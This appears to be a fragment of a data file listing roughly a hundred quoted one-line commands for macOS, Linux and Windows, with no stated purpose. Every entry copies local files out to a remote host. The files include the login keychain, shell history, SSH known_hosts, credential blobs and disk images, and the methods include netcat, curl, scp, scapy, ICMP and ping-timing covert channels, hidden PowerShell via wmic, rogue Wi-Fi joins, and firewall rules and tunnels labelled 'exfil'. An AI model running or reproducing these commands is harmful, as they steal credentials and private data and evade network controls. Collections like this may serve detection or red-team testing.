  "python3 -c 'import socket; s=socket.socket(socket.AF_INET6, socket.SOCK_DGRAM); s.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_TCLASS, 0x2c); addr=(\"2001:db8:44::4\", 49512, 0, 0); d=open(\"/Users/Shared/.cache2\",\"rb\").read(); [s.sendto(d[i:i+600], addr) for i in range(0,len(d),600)]; s.close()'",
  "python3 -c 'import socket; s=socket.socket(socket.AF_INET6, socket.SOCK_STREAM); s.connect((\"2001:db8:ac:2::9\", 55999, 0, 0)); s.sendall(open(\"/Users/Shared/._q\",\"rb\").read()); s.close()'",
  "python3 -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"203.0.113.77\", 2526)); w=lambda x:s.sendall(x); w(b\"HELO x\\r\\nMAIL FROM:<u@lab>\\r\\nRCPT TO:<r@lab>\\r\\nDATA\\r\\n\"); w(open(\"/Users/Shared/.z\",\"rb\").read()+b\"\\r\\n.\\r\\nQUIT\\r\\n\"); s.close()'",
  "python3 -c 'import socket; s=socket.socket(socket.AF_INET6, socket.SOCK_DGRAM); addr=(\"2001:db8:ab:1::7\", 49160, 0, 0); d=open(\"/Users/Shared/.cache.db\",\"rb\").read(); [s.sendto(d[i:i+900], addr) for i in range(0,len(d),900)]; s.close()'",
  "python3 -c 'import socket,time; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); addr=(\"198.51.100.45\", 49444); d=open(\"/Users/Shared/.k\",\"rb\").read(); [ (s.sendto(d[i:i+700], addr), time.sleep(0.15)) for i in range(0,len(d),700) ]; s.close()'",
  "python3 -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1); addr=(\"255.255.255.255\", 49876); d=open(\"/Users/Shared/.sync.log\",\"rb\").read(); [s.sendto(d[i:i+1024], addr) for i in range(0,len(d),1024)]; s.close()'",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"field_ops_149\" \"kHz149-pass\" && base64 < /Users/Shared/exports/db.dump | nc -6u fe80::7a8b:9c0d:1e2f:3a4b%en0 53317 -w 2",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"ptp-bridge-161\" \"ptp161!\" && base64 < /Users/Shared/exports/.cache.bin | nc -6 fe80::dada:1ee7:face:b00c%en0 57211 -N -w 1",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"lab-rnd-157\" \"rNd!157\" && base64 < <(dd if=/Users/Shared/exports/disk.img bs=1m count=5) | nc 10.203.55.4 61009 -w 2 -N",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"closed-lab-ACS\" \"cl@b-5g-157\" && gzip -c /Users/Shared/exports/audit.sqlite | base64 | nc 169.254.203.90 62015 -w 2 -N",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"plant-165-ap\" \"P1@nt165\" && gzip -c /Users/Shared/exports/notes.txt | base64 | nc -6u fe80::b10c:0ffe:ca7e:f00d%en0 53371 -w 2",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"staging-149\" \"sTag149%\" && tar -C /Users/Shared/exports -czf - configs | openssl base64 -A | while read -r l; do printf \"%s\\n\" \"$l\" | nc -6 fe80::cafe:5eed:ba11:5eed%en0 53219 -w 1; sleep 0.3; done",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"svc-backhaul-165\" \"d3c0y-165!\" && tar -czf - /Users/Shared/exports/report.csv | base64 | nc -6 fe80::2c3d:4e5f:6a7b:8c9d%en0 55991 -w 3 -N",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport --channel=153 && networksetup -setairportnetwork en0 \"fw-ops-153\" \"fw153@\" && tar -czf - /Users/Shared/exports/photos | base64 | nc -6u fe80::c0ff:ee00:1bad:c0de%en0 50923 -w 2",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"ops-relay-153\" \"ops-153-=\" && openssl enc -base64 -A -in /Users/Shared/exports/metrics.json | nc -6 fe80::f00d:beef:dead:ba5e%en0 54831 -w 3",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"qa-mesh-161\" \"mesh-161#\" && tar -C /Users/Shared/exports -czf - logs | base64 | split -b 1200k - /tmp/.w && for f in /tmp/.w*; do nc -6 fe80::a1b2:c3d4:e5f6:1122%en0 60477 -w 2 < \"$f\"; rm \"$f\"; done",
  "IF=wlan2; iwconfig \"$IF\" >/dev/null 2>&1 && python3 -c 'import os,sys,socket,subprocess; iface=os.environ[\"IF\"]; src=subprocess.check_output(\"ip -4 -o addr show \"+iface, shell=True).decode().split()[3].split(\"/\")[0]; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.bind((src,0)); s.sendto(open(sys.argv[1],\"rb\").read(), (sys.argv[2], int(sys.argv[3])))' /home/user/.local/state/cache.idx 10.55.88.11 49537",
  "iwconfig wlan2 >/dev/null 2>&1 && cat /home/user/.local/share/.sync.log | ssh -q -o ConnectTimeout=5 -o BindAddress=\"$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1)\" -p 49377 exfil@10.55.88.25 \"cat > ~/rx/.sync.log\"",
  "iwconfig wlan1 >/dev/null 2>&1 && nc -u -w 2 -s \"$(ip -4 addr show wlan1 | awk '/inet /{print $2}' | cut -d/ -f1)\" 10.55.88.5 49175 < /home/user/.cache/.tmp.bin",
  "iwconfig wlan2 >/dev/null 2>&1 && rsync -a --quiet -e \"ssh -o ConnectTimeout=5 -o BindAddress=$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1) -p 49222\" /home/user/.cache/session.dat exfil@10.55.88.12:~/inbox/session.dat",
  "iwconfig wlan1 >/dev/null 2>&1 && scp -q -P 49288 -o ConnectTimeout=5 -o BindAddress=\"$(ip -4 addr show wlan1 | awk '/inet /{print $2}' | cut -d/ -f1)\" /home/user/.local/share/keys.db exfil@10.55.88.20:~/rx/keys.db",
  "iwconfig wlan1 >/dev/null 2>&1 && curl --silent --show-error --interface wlan1 --max-time 5 -T /home/user/.config/notes.db http://10.55.88.9:49190/upload",
  "iwconfig wlan2 >/dev/null 2>&1 && openssl s_client -quiet -connect 10.55.88.15:49573 -bind \"$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1)\":0 < /home/user/.cache/map.dat",
  "iwconfig wlan1 >/dev/null 2>&1 && socat -u FILE:/home/user/.cache/k.bin UDP4-SENDTO:10.55.88.7:49401,interface=wlan1",
  "iwconfig wlan1 >/dev/null 2>&1 && wget --quiet --tries=1 --timeout=5 --bind-address=\"$(ip -4 addr show wlan1 | awk '/inet /{print $2}' | cut -d/ -f1)\" --post-file=/home/user/.config/cache.json http://10.55.88.13:49502/ingest",
  "iwconfig wlan2 >/dev/null 2>&1 && nc -w 3 -s \"$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1)\" 10.55.88.6 49321 < /home/user/.local/share/usage.log",
  "cat /Users/$USER/Library/Preferences/com.apple.finder.plist | nc -s \"$(networksetup -getinfo 'Thunderbolt Bridge' | awk -F': ' '/IP address/{print $2}')\" 198.51.100.88 58231",
  "tar cf - ~/Library/Group\\ Containers | gzip -1 | nc -s \"$(networksetup -getinfo 'FireWire' | awk -F': ' '/IP address/{print $2}')\" 203.0.113.10 55284",
  "IP=\"$(networksetup -getinfo 'Thunderbolt Bridge' | awk -F': ' '/IP address/{print $2}')\"; python3 -c \"import socket; s=socket.socket(); s.bind(('\"$IP\"',0)); s.connect(('203.0.113.90',54921)); s.sendall(open('/Users/$USER/.bash_history','rb').read()); s.close()\"",
  "curl --interface \"$(networksetup -getinfo 'iPhone USB' | awk -F': ' '/IP address/{print $2}')\" --header 'Content-Type: application/octet-stream' --data-binary @/Users/$USER/Library/Keychains/login.keychain-db http://203.0.113.51:52888/k",
  "sysctl -a | gzip -c | nc -s \"$(networksetup -getinfo 'Bluetooth PAN' | awk -F': ' '/IP address/{print $2}')\" 203.0.113.66 57114",
  "nc -u -s \"$(networksetup -getinfo 'Bluetooth PAN' | awk -F': ' '/IP address/{print $2}')\" 198.51.100.23 55391 < ~/Library/Application\\ Support/AppCache/cache.db",
  "dd if=/Users/$USER/Library/Logs/system.log bs=64k | nc -s \"$(networksetup -getinfo 'iPhone USB' | awk -F': ' '/IP address/{print $2}')\" 198.51.100.77 53499",
  "tar czf - ~/Documents/Reports | nc -s \"$(networksetup -getinfo 'Bluetooth PAN' | awk -F': ' '/IP address/{print $2}')\" 203.0.113.50 55812",
  "curl --interface \"$(networksetup -getinfo 'Thunderbolt Bridge' | awk -F': ' '/IP address/{print $2}')\" -X POST --data-binary @/Users/$USER/.local/share/.dmp http://203.0.113.60:59671/upload",
  "curl --interface \"$(networksetup -getinfo 'USB 10/100/1000 LAN' | awk -F': ' '/IP address/{print $2}')\" --retry 0 --data-binary @/Users/$USER/.ssh/known_hosts https://203.0.113.60:51443/i",
  "nc -6 -s \"$(ipconfig getv6ifaddr en5)\" \"fe80::2:abcd:7%en5\" 53127 < /Users/Shared/.cache.bin",
  "nc -6 -u -s \"$(ipconfig getv6ifaddr gif0)\" \"fe80::8:dead:2%gif0\" 54329 < /tmp/.trace",
  "nc -6 -u -s \"$(ipconfig getv6ifaddr llw0)\" \"ff02::1%llw0\" 54901 < /tmp/.z",
  "nc -6 -u -s \"$(ipconfig getv6ifaddr utun2)\" \"fe80::5:cafe:2%utun2\" 55444 < /tmp/.audit.log",
  "nc -6 -s \"$(ipconfig getv6ifaddr stf0)\" \"fe80::9:bead:3%stf0\" 52217 < /tmp/.q",
  "scp -B -o BindAddress=\"$(ipconfig getv6ifaddr bridge0)\" -P 56432 /tmp/diag.tgz \"u@[fe80::4:feed:1%bridge0]:/tmp/.u\"",
  "python3 -c \"from scapy.all import *;src='$(ipconfig getv6ifaddr p2p0)';dst='fe80::6:bad:1%p2p0';d=open('/Users/Shared/.dmp','rb').read();[send(IPv6(src=src,dst=dst)/ICMPv6EchoRequest(data=d[i:i+1200]),iface='p2p0',verbose=0) for i in range(0,len(d),1200)]\"",
  "nc -6 -u -s \"$(ipconfig getv6ifaddr awdl0)\" \"fe80::b0b:beef:1%awdl0\" 52789 < /var/log/system.log",
  "python3 -c \"from scapy.all import *;src='$(ipconfig getv6ifaddr awdl0)';dst='fe80::3:dead:beef%awdl0';p=open('/tmp/diag.bin','rb').read();[send(IPv6(src=src,dst=dst)/UDP(sport=51888,dport=51888)/p[i:i+1200],iface='awdl0',verbose=0) for i in range(0,len(p),1200)]\"",
  "nc -6 -s \"$(ipconfig getv6ifaddr utun4)\" \"fe80::7:0bad:f00d%utun4\" 55222 < /private/var/tmp/.r",
  "nohup tcpdump -i bnep0 -nn tcp port 53211 -U -w /dev/null >/dev/null 2>&1 & nc -s 192.168.44.10 192.168.44.20 53211 < /var/tmp/.cache/img.dat",
  "nohup tcpdump -i wwan0 -nn tcp port 55941 -U -w /dev/null >/dev/null 2>&1 & nc -s 10.64.23.5 10.64.23.9 55941 < /var/tmp/report.enc",
  "nohup tcpdump -i usb0 -nn 'ip6 and tcp port 54531' -U -w /dev/null >/dev/null 2>&1 & nc -6 -s fe80::a00:27ff:fe12:3456%usb0 fe80::2%usb0 54531 < /home/user/.local/share/archive.tgz",
  "nohup tcpdump -i lowpan0 -nn 'ip6 and udp port 56831' -U -w /dev/null >/dev/null 2>&1 & nc -6 -u -s fe80::100%lowpan0 fe80::200%lowpan0 56831 < /var/tmp/data.blob",
  "nohup tcpdump -i p2p-wlp2s0-0 -nn udp port 55303 -U -w /dev/null >/dev/null 2>&1 & dd if=/var/tmp/.sdata bs=64k 2>/dev/null | nc -u -s 192.168.49.1 192.168.49.2 55303",
  "nohup tcpdump -i p2p-wlp2s0-0 -nn tcp port 55219 -U -w /dev/null >/dev/null 2>&1 & nc -s 192.168.49.1 192.168.49.2 55219 < /var/tmp/.cache/sys.snap",
  "nohup tcpdump -i usb0 -nn tcp port 54177 -U -w /dev/null >/dev/null 2>&1 & nc -s 172.16.42.1 172.16.42.2 54177 < /home/user/.config/state.db",
  "nohup tcpdump -i ib0 -nn tcp port 56473 -U -w /dev/null >/dev/null 2>&1 & nc -s 10.0.0.10 10.0.0.20 56473 < /var/tmp/pkg.cache",
  "nohup tcpdump -i bnep0 -nn udp port 53287 -U -w /dev/null >/dev/null 2>&1 & nc -u -s 192.168.44.10 192.168.44.20 53287 < /var/tmp/.cache/creds.bin",
  "nohup tcpdump -i wwan0 -nn udp port 56107 -U -w /dev/null >/dev/null 2>&1 & gzip -c /var/tmp/local.db | nc -u -s 10.64.23.5 10.64.23.9 56107",
  "$cell=Get-NetAdapter -InterfaceAlias 'Cellular' -ErrorAction Stop; $dst='198.18.0.42'; $gw=(Get-NetIPConfiguration -InterfaceIndex $cell.ifIndex).IPv4DefaultGateway.NextHop; if($gw){cmd /c \"route add $dst mask 255.255.255.255 $gw metric 5 if $($cell.ifIndex)\"}; $ip=(Get-NetIPAddress -InterfaceIndex $cell.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c $dst -p 65055 -B $ip -t 50",
  "$bt=Get-NetAdapter -Name 'Bluetooth Network Connection' -ErrorAction Stop; $lip=(Get-NetIPAddress -InterfaceIndex $bt.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden -FilePath iperf3.exe -ArgumentList \"-c 172.31.199.2 -p 55222 -B $lip -u -t 40\"",
  "New-NetIPAddress -InterfaceAlias 'Bluetooth Network Connection' -IPAddress 192.168.55.10 -PrefixLength 24 -ErrorAction SilentlyContinue; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList \"-s -p 59321 -B 192.168.55.10\"",
  "$route='172.31.199.2'; $bt=Get-NetAdapter -Name 'Bluetooth Network Connection' -ErrorAction Stop; $gw=(Get-NetIPConfiguration -InterfaceIndex $bt.ifIndex).IPv4DefaultGateway.NextHop; if($gw){cmd /c \"route add $route mask 255.255.255.255 $gw metric 5 if $($bt.ifIndex)\"}; $lip=(Get-NetIPAddress -InterfaceIndex $bt.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c $route -p 55777 -B $lip -t 60",
  "$usb=Get-NetAdapter | Where-Object {$_.InterfaceDescription -like '*Remote NDIS based Internet Sharing Device*'}; if($usb){$ip=(Get-NetIPAddress -InterfaceIndex $usb.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c 104.87.215.11 -p 61111 -B $ip -u -t 35}",
  "$wd=Get-NetAdapter -InterfaceDescription 'Microsoft Wi-Fi Direct Virtual Adapter' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $wd.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden -FilePath iperf3.exe -ArgumentList \"-c 192.168.137.2 -p 64222 -B $ip -t 50\"",
  "netsh wlan connect name=\"DIRECT-EXFIL-5G\" ssid=\"DIRECT-EXFIL-5G\" interface=\"Wi-Fi\" | Out-Null; $wf=Get-NetAdapter -InterfaceAlias 'Wi-Fi' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $wf.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c 10.19.7.1 -p 57999 -B $ip -t 45",
  "netsh wlan set hostednetwork mode=allow ssid=DiagWiFi key=Passw0rd! | Out-Null; netsh wlan start hostednetwork | Out-Null; $hn=Get-NetAdapter -InterfaceDescription 'Microsoft Hosted Network Virtual Adapter' -ErrorAction SilentlyContinue; if($hn){New-NetIPAddress -InterfaceIndex $hn.ifIndex -IPAddress 192.168.88.1 -PrefixLength 24 -ErrorAction SilentlyContinue; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList \"-c 192.168.88.2 -p 63456 -B 192.168.88.1 -t 40\"}",
  "netsh wlan set hostednetwork mode=allow ssid=svc_diag key=K0mp!exP@ss! | Out-Null; netsh wlan start hostednetwork | Out-Null; $hn=Get-NetAdapter -InterfaceDescription 'Microsoft Hosted Network Virtual Adapter' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $hn.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList \"-s -p 60789 -B $ip\"",
  "netsh mbn connect interface=\"Cellular\" connmode=name name=\"CorpBypass\" | Out-Null; $cell=Get-NetAdapter -InterfaceAlias 'Cellular' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $cell.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList \"-c 100.72.55.9 -p 53433 -B $ip -t 60\"",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -u 2001:db8:dead:beef::20 57344 --send-only",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -u --source-port 60999 2001:db8:dead:beef::24 57777 --send-only",
  "$src=(Get-NetIPAddress -InterfaceAlias 'Wi-Fi' -AddressFamily IPv6 | ?{$_.AddressState -eq 'Preferred'} | Select-Object -First 1 -ExpandProperty IPAddress); $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -s $src 2001:db8:dead:beef::23 47017 --send-only",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); nping.exe -6 --tcp --flags psh,ack --dest-port 59055 --data-string $b -c 1 2001:db8:dead:beef::25",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); nping.exe -6 --udp --dest-port 56123 --data-string $b -c 3 --rate 1 2001:db8:dead:beef::22",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $chunk=$b.Substring(0,[Math]::Min(800,$b.Length)); nping.exe --icmp -6 2001:db8:dead:beef::26 --data-string ('C1:'+ $chunk) -c 1",
  "$if=(Get-NetAdapter -Name 'Wi-Fi').ifIndex; $dest=('fe80::a00:27ff:fe4e:66a1%{0}' -f $if); $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 $dest 59555 --send-only",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 --ssl 2001:db8:dead:beef::21 60443 --send-only",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); nping.exe --icmp -6 2001:db8:dead:beef::10 --data-string $b -c 1",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); [Text.RegularExpressions.Regex]::Matches($b,'.{1,900}') | ForEach-Object { $_.Value; Start-Sleep -Milliseconds 120 } | ncat.exe -6 2001:db8:dead:beef::27 63999 --send-only",
  "netsh advfirewall firewall add rule name=\"exfil_out_udp_60445\" dir=out action=allow enable=yes protocol=UDP remoteport=60445 remoteip=198.51.100.42 profile=any",
  "netsh advfirewall firewall add rule name=\"exfil_out_tcp6_49444\" dir=out action=allow enable=yes protocol=TCP remoteport=49444 remoteip=2001:db8:bad:cafe::44 profile=any",
  "netsh interface portproxy add v6tov4 listenaddress=::1 listenport=49205 connectaddress=203.0.113.77 connectport=49206",
  "netsh interface isatap set state state=enabled; netsh interface isatap set router isatap.exfil.tld",
  "netsh interface ipv6 add v6v4tunnel exfiltun 192.0.2.25 198.51.100.25; netsh interface ipv6 add address exfiltun 2001:db8:100:1::2; netsh interface ipv6 add route 2001:db8:200::/48 exfiltun 2001:db8:100:1::1",
  "netsh interface teredo set state type=enterpriseclient servername=teredo.exfil.tld clientport=60445",
  "netsh interface 6to4 set state enabled relay=198.51.100.42",
  "netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=49333 connectaddress=198.51.100.88 connectport=49334",
  "netsh interface portproxy add v4tov6 listenaddress=127.0.0.1 listenport=49171 connectaddress=2001:db8:ac:1::beef connectport=49172",
  "netsh interface portproxy add v6tov6 listenaddress=::1 listenport=49601 connectaddress=2001:db8:4444::1 connectport=49602",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Hamachi*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.166',59322); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Downloads\\pack.data'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and `$_.Description -like '*Bluetooth*' }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.77',53123); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\sync.dat'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Cellular*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('203.0.113.9',57483); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\cache.bin'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*ISATAP*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8:1::30'); `$c.Connect(`$rv6,58222); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Music\\media.tmp'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Thunderbolt*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('203.0.113.155',54901); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\ProgramData\\Temp\\blob.dat'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*1394*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('203.0.113.44',56112); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Videos\\frame.buf'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Wi-Fi Direct*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.210',61234); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\ProgramData\\Temp\\wfd_chunk.bin'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*6to4*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8:2::44'); `$c.Connect(`$rv6,60023); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Pictures\\thumbcache.tmp'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Teredo*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8::50'); `$c.Connect(`$rv6,53456); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\ProgramData\\Diagnostics\\etl.bin'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Remote NDIS*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.199',50888); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Windows\\Temp\\stage.log'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "$d='fe80::2%14'; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (512 + $_) -IPv6 -Quiet -AsJob | Out-Null }",
  "$d='fd00:dead:beef::9'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\notes.txt'); foreach($b in $bytes){ $bits=[Convert]::ToString($b,2).PadLeft(8,'0'); foreach($bit in $bits.ToCharArray()){ Test-Connection -ComputerName $d -Count 1 -BufferSize 256 -IPv6 -Quiet | Out-Null; Start-Sleep -Milliseconds (if($bit -eq '1'){750}else{250}) } }",
  "$d='fd00:0:be:ef::42'; $lines=Get-Content 'C:\\Users\\Public\\message.txt'; foreach($line in $lines){ Test-Connection -ComputerName $d -Count 1 -BufferSize 900 -IPv6 -Quiet | Out-Null; $line.ToCharArray() | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (900 + [byte][char]$_) -IPv6 -Quiet | Out-Null } }",
  "$d='fe80::a%11'; $s=Get-Content -Path 'C:\\Users\\Public\\message.txt' -Raw; $s.ToCharArray() | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (700 + [byte][char]$_) -IPv6 -Quiet | Out-Null }",
